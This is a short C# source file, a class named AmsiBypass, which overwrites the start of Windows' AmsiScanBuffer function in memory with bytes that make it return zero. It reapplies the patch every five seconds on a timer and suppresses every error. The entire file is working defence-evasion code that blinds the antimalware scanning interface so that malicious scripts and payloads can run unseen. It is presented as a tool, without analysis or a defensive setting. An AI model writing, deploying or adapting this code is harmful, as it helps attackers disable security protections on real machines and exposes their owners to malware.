using System;
using System.Runtime.InteropServices;
using System.Threading;

public static class AmsiBypass
{
    [DllImport("kernel32")]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32")]
    private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    private static Timer amsiTimer;
    private static readonly int PatchIntervalMs = 5000; // 5 seconds duration per patch

    public static void Start()
    {
        Bypass();

        amsiTimer = new Timer(_ => Bypass(), null, PatchIntervalMs, PatchIntervalMs);
    }

    public static void Stop()
    {
        amsiTimer?.Dispose();
        amsiTimer = null;
    }

    public static void Bypass()
    {
        try
        {
            IntPtr amsi = GetProcAddress(GetModuleHandle("amsi.dll"), "AmsiScanBuffer");
            if (amsi == IntPtr.Zero)
                return;

            uint oldProtect;
            if (VirtualProtect(amsi, (UIntPtr)6, 0x40, out oldProtect))
            {
                byte[] patch = new byte[] { 0x31, 0xC0, 0xC3 }; // xor eax,eax; ret
                Marshal.Copy(patch, 0, amsi, patch.Length);
                VirtualProtect(amsi, (UIntPtr)6, oldProtect, out oldProtect);
            }
        }
        catch
        {
        }
    }
}
